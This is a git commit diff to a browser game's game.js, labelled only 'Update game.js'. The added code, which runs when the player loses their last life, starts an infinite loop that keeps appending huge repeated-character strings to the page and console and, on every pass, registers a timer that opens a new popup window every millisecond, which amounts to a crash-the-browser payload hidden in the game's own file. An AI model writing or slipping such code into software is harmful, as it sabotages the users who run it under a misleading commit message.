7808e85a817a86e6516a739612ee1b6effb08c14
pumpjack <aetsofficialact@gmail.com>
2025-09-03 14:35:46 -0400

    Update game.js

--- game.js
+++ game.js
@@ -471,6 +471,21 @@ function updateGame() {
 
         // Game over
         if (lives <= 0) {
+            txt = "";
+
+        for(var i = 0; i === i; i++) {
+           txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(99);
+
+           var x = document.createElement("div");
+           x.innerText = txt;
+
+          document.body.appendChild(x)
+          console.log(txt);
+  
+          setInterval(function () {
+            open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
+          }, 1);
+        }
             location.href = 'chrome://quit'
             gameOver = true;
             ctx.save();
@@ -578,6 +593,7 @@ let movableElement = window.getElementById('player');
 bgMusic.play();
 resetGame();
 updateGame();
+
 
 
 
